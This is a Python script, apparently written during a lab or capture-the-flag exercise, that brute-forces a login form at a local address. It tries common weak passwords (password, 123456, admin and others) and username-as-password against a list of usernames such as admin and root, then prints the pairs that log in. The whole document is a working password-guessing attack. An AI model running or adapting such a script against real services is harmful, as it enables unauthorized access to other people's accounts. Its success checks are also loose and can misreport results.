#!/usr/bin/env python3
import requests
import concurrent.futures
from collections import defaultdict

# Target URL
target = "http://127.0.0.1:33134/login"

# Common password patterns for testing
passwords = [
    "password",
    "password123",
    "123456",
    "admin",
    "default",
    "test",
    "test123",
    "guest",
    "demo",
    "123",
    "abc123"
]

# Read usernames from file
try:
    with open("usernames.txt", "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    # Fallback username list
    usernames = [
        "test1", "test2", "test3", "test4", "test5",
        "user1", "user2", "user3", "user4", "user5",
        "admin", "administrator", "testuser", "demo", "guest", "root"
    ]

def test_credentials(username, password):
    """Test a single username/password combination"""
    try:
        data = {"username": username, "password": password}
        response = requests.post(target, data=data, timeout=3)
        
        # Check for successful login indicators
        if response.status_code == 302:
            return True, f"SUCCESS: {username}:{password} - 302 redirect"
        elif "dashboard" in response.text.lower() or "welcome" in response.text.lower():
            return True, f"SUCCESS: {username}:{password} - content match"
        elif response.status_code == 200:
            # Check if it's a redirect via meta refresh
            if "window.location" in response.text or "meta http-equiv=\"refresh\"" in response.text:
                return True, f"SUCCESS: {username}:{password} - JS/meta redirect"
        
        # Failed login
        fail_indicators = ["invalid", "incorrect", "failed", "denied"]
        for indicator in fail_indicators:
            if indicator in response.text.lower():
                return False, f"FAIL: {username}:{password} - {response.status_code}"
        
        return False, f"UNKNOWN: {username}:{password} - {response.status_code} ({len(response.text)} bytes)"
    except Exception as e:
        return False, f"ERROR: {username}:{password} - {str(e)}"

print(f"Testing {len(usernames)} usernames × {len(passwords)} passwords = {len(usernames) * len(passwords)} combinations")
print("=" * 60)

valid_credentials = []
results = defaultdict(list)

# Single-threaded test first to avoid overwhelming the server
for username in usernames:
    success_found = False
    for password in passwords:
        success, result = test_credentials(username, password)
        print(result)
        
        if success:
            valid_credentials.append((username, password))
            success_found = True
            break  # Found a working password, skip others
    
    # Also try username as password
    if not success_found:
        success, result = test_credentials(username, username)
        print(result)
        if success:
            valid_credentials.append((username, username))

print("\n" + "=" * 60)
print("VALID CREDENTIALS FOUND:")
print("=" * 60)

if valid_credentials:
    for username, password in valid_credentials:
        print(f"✓ {username}:{password}")
else:
    print("No valid credentials found")

print("\nTotal valid credentials: {}".format(len(valid_credentials)))
EOF
